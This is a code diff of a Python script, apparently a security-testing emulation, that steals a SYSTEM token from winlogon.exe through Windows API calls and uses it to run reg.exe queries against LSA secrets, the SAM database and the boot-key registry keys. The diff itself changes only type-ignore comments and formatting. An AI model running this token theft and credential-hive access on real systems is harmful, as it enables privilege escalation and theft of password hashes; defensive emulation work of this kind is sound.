@@ -27,7 +27,7 @@ log = logging.getLogger(__name__)
 )
 def main():
     import ctypes
-    from ctypes import byref, windll, wintypes
+    from ctypes import byref, windll, wintypes  # type: ignore
 
     hprocess = wintypes.HANDLE()
     hsystem_token = wintypes.HANDLE()
@@ -74,15 +74,15 @@ def main():
             ("hStdError", wintypes.HANDLE),
         )
 
-    OpenProcess = windll.kernel32.OpenProcess
+    OpenProcess = windll.kernel32.OpenProcess  # type: ignore
     OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
     OpenProcess.restype = wintypes.HANDLE
 
-    OpenProcessToken = windll.kernel32.OpenProcessToken
+    OpenProcessToken = windll.kernel32.OpenProcessToken  # type: ignore
     OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPCVOID]
     OpenProcessToken.restype = wintypes.BOOL
 
-    DuplicateTokenEx = windll.advapi32.DuplicateTokenEx
+    DuplicateTokenEx = windll.advapi32.DuplicateTokenEx  # type: ignore
     DuplicateTokenEx.restype = wintypes.BOOL
     DuplicateTokenEx.argtypes = [
         wintypes.HANDLE,  # TokenHandle
@@ -93,7 +93,7 @@ def main():
         wintypes.HANDLE,  # phNewToken
     ]
 
-    CreateProcessWithTokenW = windll.advapi32.CreateProcessWithTokenW
+    CreateProcessWithTokenW = windll.advapi32.CreateProcessWithTokenW  # type: ignore
     CreateProcessWithTokenW.argtypes = [
         wintypes.HANDLE,  # hToken
         wintypes.DWORD,  # dwLogonFlags
@@ -107,20 +107,25 @@ def main():
     ]
     CreateProcessWithTokenW.restype = wintypes.BOOL
 
-    CloseHandle = windll.kernel32.CloseHandle
+    CloseHandle = windll.kernel32.CloseHandle  # type: ignore
     CloseHandle.argtypes = [wintypes.HANDLE]
     CloseHandle.restype = wintypes.BOOL
 
     # Duplicate winlogon.exe System Token
-    hprocess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, _common.getppid("winlogon.exe"))
+    hprocess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, _common.get_process_pid("winlogon.exe"))  # type: ignore
     OpenProcessToken(hprocess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, byref(hsystem_token))
     DuplicateTokenEx(hsystem_token, TOKEN_ALL_ACCESS, 0, SecurityImpersonation, TokenPrimary, byref(hsystem_token_dup))
 
     # create process with winlogon system token duplicate to query specific sensitive registry keys using reg.exe
     process_info = PROCESS_INFORMATION()
     startup_info = STARTUPINFO()
-    cmdline = " /c reg.exe query hklm\\security\\policy\\secrets && reg.exe query hklm\\SAM\\SAM\\Domains\\Account && reg.exe query hklm\\SYSTEM\\ControlSet001\\Control\\Lsa\\JD && reg.exe query hklm\\SYSTEM\\ControlSet001\\Control\\Lsa\\Skew1"
-    res = CreateProcessWithTokenW(
+    cmdline = (
+        " /c reg.exe query hklm\\security\\policy\\secrets "
+        "&& reg.exe query hklm\\SAM\\SAM\\Domains\\Account "
+        "&& reg.exe query hklm\\SYSTEM\\ControlSet001\\Control\\Lsa\\JD "
+        "&& reg.exe query hklm\\SYSTEM\\ControlSet001\\Control\\Lsa\\Skew1"
+    )
+    res = CreateProcessWithTokenW(  # type: ignore
         hsystem_token_dup,
         LOGON_WITH_PROFILE,
         "C:\\Windows\\System32\\cmd.exe",
